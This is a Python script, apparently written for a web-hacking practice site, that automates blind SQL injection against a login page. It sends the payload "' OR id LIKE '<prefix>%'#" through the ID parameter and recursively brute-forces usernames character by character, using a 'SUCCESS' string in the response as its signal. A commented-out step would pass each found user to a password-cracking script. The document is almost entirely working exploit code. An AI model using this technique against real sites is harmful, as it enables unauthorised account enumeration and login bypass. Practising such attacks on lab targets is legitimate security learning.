import requests
import os
import time

url = "https://daehun.webhacking.site/login/blind_login.php"
# pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pool = "abcdefghijklmnopqrstuvwxyz0123456789"
# pool = "abeghilnopuy"

def recursive(string):
    # 종료 조건
    if len(string) > 7 : # 검사 길이 3개 까지
        return

    print(string)
    # get할 URL 작성(% 붙음)
    payload =  "?ID=%27+OR+id+LIKE+%27" + string + "%25" + "%27%23"
    result_url = url + payload

    # request 보냄
    response = requests.get(result_url)

    # 성공여부 검사
    if "SUCCESS" in response.text : # 성공하면
        payload2 =  "?ID=%27+OR+id+LIKE+%27" + string + "%27%23"
        result_url2 = url + payload2

        # request 보냄
        response2 = requests.get(result_url2)

        # 성공여부 검사
        if "SUCCESS" in response2.text : # 성공하면
            print("FIND = ", string)
            # exit(0)
            # print("USER = " + string + " | PASSWORD = ", end="")
            # 비밀번호 알아내기
            # os.system("python3 find_password.py " + string + " -q")
        # 재귀
        for alphabet in pool : 
            recursive(string + alphabet)
    else :
        # print("없음!")
        return

print("url = ", url)
print("=== start ===")
recursive("")

